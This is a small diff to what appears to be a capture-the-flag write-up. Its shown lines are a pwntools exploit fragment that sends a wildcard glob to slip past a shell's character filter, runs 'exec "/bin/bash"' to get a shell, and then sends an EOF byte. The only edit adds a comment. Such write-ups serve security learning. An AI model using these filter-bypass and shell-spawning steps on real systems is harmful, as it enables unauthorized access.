@@ -86,7 +86,7 @@ io.sendlineafter(b'$', b'???/???/?????.??.?')
 io.wait(0.1)
 io.sendline(b'exec "/bin/bash"')
 io.wait(0.1)
-io.sendline(b'\x04')
+io.sendline(b'\x04') # EOF in ASCII
 
 io.interactive()
 ```
